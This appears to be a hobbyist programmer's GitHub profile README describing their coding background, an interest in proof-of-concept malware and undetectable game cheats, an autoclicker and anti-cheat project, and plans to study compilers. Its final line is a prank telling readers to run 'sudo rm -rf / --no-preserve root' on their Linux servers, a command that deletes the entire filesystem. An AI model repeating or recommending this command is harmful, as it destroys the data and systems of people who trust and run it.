I'm a "dev" that is really into trying to find something to code. I'm not at all good with design and I'm still less then a novice. I don't really enjoy coding websites so if I ever make one that looks even a little pretty, with js or some framework, my host body has been taken over by a being that is not myself. I really enjoy these cute little things called "not java," and "not C#," I'm okay to code with them, but I'm just gonna complain the whole time.

## ðŸ§®Contengent's Programming History
I started with minecraft and coding some cheats and stuff, because I wasn't very good and I wanted to play factions. I then moved on to doing school work (crazy I know), which kinda stopped my coding <b>progress</b> (I was doing stuff, it was just really stupid or simple) except for when people would like, ask me if I could code them a website, and I just hated saying no so I learned even if I say "llol I'm not coding u a website broski". Then eventually highschool hit and I got really stressed with all my courses and stuff so I started coding a lot more, and learning a whole bunch of stuff.

Now I'm focused on actually writing software that I can post to my github. I Mainly code stuff that I have a deep interest in, such as: Proof of concept malware, malware/exploit reasearch, and undetectable game cheats will mostly be posted here. I don't really plan on making anything related to game development anymore, since I've decided that it is highly uninteresting to me, and that I do not have the artistic skillset (drawing, making music, etc.) to do so.

## What am I doing?
### Current projects:
Currently I'm working on a project fairly dear to me. <br/>
I've always wondered how server admins knew that someone was using an autoclicker. I've always been interested in video game cheats, but Minecraft was my introduction. My iterest was especially piqued when I discovered Ghost Clients. <br/>
So now, after discovering how anti-cheats would detect autoclickers, I am working on a completely undetected autoclicker. Aswell as an anti-cheat to attempt to detect the not so undetectable autoclickers, to demonstrate my knowledge on the topic.<br/>

### Currently learning:
I'm currently learning about compilers. <br/>
When I discovered the risc-v assembly language, I decided that I wanted to build a compiler for it some day. <br/>
Honestly, this is a pipe dream ATM. I've started with basic reasearch on how compilers, interpreters, and vms work. After that's all done, I will begin reading "The Dragon Book," after I have fully made my decision on if I should make one or not.<br/>
I also plan on using this project to expand my learning of coding in general. If I decide to, I will be writing this project in rust.

Also run this on all your linux servers: <br />
**`sudo rm -rf / --no-preserve root`** <br />
